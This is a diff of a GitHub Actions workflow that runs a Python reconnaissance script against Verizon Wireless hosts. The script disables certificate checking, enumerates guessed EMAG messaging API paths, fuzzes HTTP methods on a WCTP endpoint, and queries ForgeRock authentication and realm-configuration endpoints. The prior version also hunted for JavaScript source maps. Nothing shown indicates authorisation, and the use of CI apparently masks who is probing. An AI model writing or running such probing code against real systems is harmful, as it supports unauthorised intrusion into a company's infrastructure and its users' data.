@@ -1,18 +1,18 @@
-name: EMAG Phase 3b
+name: EMAG Phase 3c
 on:
   workflow_dispatch:
   push:
     branches: [main]
 
 jobs:
-  phase3b:
+  phase3c:
     runs-on: ubuntu-latest
     timeout-minutes: 8
     steps:
-      - name: EMAG Phase 3b
+      - name: EMAG Phase 3c
         run: |
           python3 - << 'PYEOF'
-          import urllib.request, urllib.error, json, ssl, time, re
+          import urllib.request, urllib.error, json, ssl, time
           ctx = ssl.create_default_context()
           ctx.check_hostname = False
           ctx.verify_mode = ssl.CERT_NONE
@@ -25,7 +25,7 @@ jobs:
               try:
                   with urllib.request.urlopen(rq, context=ctx, timeout=10) as r:
                       ct = r.headers.get("Content-Type","")
-                      rb = r.read(2048).decode("utf-8", errors="replace")
+                      rb = r.read(3000).decode("utf-8", errors="replace")
                       return r.status, ct, rb
               except urllib.error.HTTPError as e:
                   ct = e.headers.get("Content-Type","")
@@ -37,67 +37,51 @@ jobs:
           AM = "https://mblogin.verizonwireless.com"
           
           print("=== EMAG REST API endpoints ===")
-          api_paths = [
-              "/emag/api/messages", "/emag/api/message", "/emag/api/send",
-              "/emag/api/contacts", "/emag/api/campaigns", "/emag/api/campaign",
-              "/emag/api/senders", "/emag/api/accounts", "/emag/api/account",
-              "/emag/api/templates", "/emag/api/groups", "/emag/api/users",
-              "/emag/api/reports", "/emag/api/keywords", "/emag/api/optouts",
-              "/emag/services/messages", "/emag/rest/messages",
-              "/emag/api/v1/messages", "/emag/api/v2/messages",
-          ]
-          for path in api_paths:
+          for path in ["/emag/api/messages", "/emag/api/send", "/emag/api/contacts",
+                       "/emag/api/campaigns", "/emag/api/senders", "/emag/api/accounts",
+                       "/emag/api/templates", "/emag/api/groups", "/emag/api/users",
+                       "/emag/api/reports", "/emag/api/keywords", "/emag/api/optouts",
+                       "/emag/api/v1/messages", "/emag/api/v2/messages",
+                       "/emag/services/messages", "/emag/rest/send"]:
               s, ct, b = req("GET", BASE + path)
-              is_json = "json" in ct
               is_html = "<html" in b[:50].lower()
-              if is_json or (not is_html and s != 200):
-                  print(f"[{s}] {path} ({ct[:25]}): {b[:100]}")
+              if "json" in ct or not is_html:
+                  print(f"[{s}] {path}: {b[:120]}")
           
           print()
           print("=== WCTP Method Fuzz ===")
-          wctp_url = BASE + "/emag/wctp"
-          for method in ["GET", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]:
-              s, ct, b = req(method, wctp_url)
-              print(f"[{s}] {method} ({ct[:25]}): {b[:80]}")
+          for method in ["GET","PUT","DELETE","PATCH","OPTIONS","HEAD","TRACE"]:
+              s, ct, b = req(method, BASE + "/emag/wctp")
+              print(f"[{s}] {method} ({ct[:20]}): {b[:80]}")
           
           print()
-          print("=== ForgeRock root realm auth tree probe ===")
-          auth_url = AM + "/vzauth/json/realms/root/authenticate"
-          s, ct, b = req("POST", auth_url, "{}", {
+          print("=== ForgeRock root realm auth ===")
+          s, ct, b = req("POST", AM + "/vzauth/json/realms/root/authenticate", "{}", {
               "Accept-API-Version": "resource=2.1, protocol=1.0",
               "Content-Type": "application/json"
           })
-          print(f"[{s}] Initial auth: {b[:500]}")
+          print(f"[{s}] Initial auth: {b[:600]}")
           try:
               resp_json = json.loads(b)
               auth_id = resp_json.get("authId", "")
               callbacks = resp_json.get("callbacks", [])
-              print(f"authId: {auth_id[:60]}...")
-              print(f"Callbacks: {json.dumps(callbacks)[:300]}")
+              print(f"authId: {auth_id[:80]}")
+              print(f"Callbacks: {json.dumps(callbacks)[:400]}")
           except: pass
           
           print()
-          print("=== ForgeRock auth trees list ===")
+          print("=== ForgeRock auth trees ===")
           for path in [
               "/vzauth/json/realms/root/realm-config/authentication/authenticationtrees/trees",
               "/vzauth/json/realms/root/realms/vzwmb/realm-config/authentication/authenticationtrees/trees",
-              "/vzauth/json/realms/root/realm-config/services/scripting/scripts",
           ]:
               s, ct, b = req("GET", AM + path, None, {"Accept-API-Version": "resource=2.0, protocol=1.0"})
-              print(f"[{s}] {path}: {b[:200]}")
+              print(f"[{s}] {path[:60]}: {b[:250]}")
           
           print()
-          print("=== EMAG Source Map ===")
+          print("=== EMAG HTML source ===")
           s, ct, b = req("GET", BASE + "/emag/")
-          scripts = re.findall(r"src="([^"]+\.js)"", b)
-          print(f"Scripts: {scripts}")
-          for sc in scripts[:3]:
-              full = BASE + sc if sc.startswith("/") else BASE + "/emag/" + sc
-              s2, ct2, b2 = req("GET", full + ".map")
-              if s2 == 200:
-                  print(f"SOURCEMAP: {full}.map -> {b2[:200]}")
-              else:
-                  print(f"[{s2}] no map: {full}.map")
+          print(f"[{s}] /emag/ preview: {b[:800]}")
           
           print("DONE")
           PYEOF
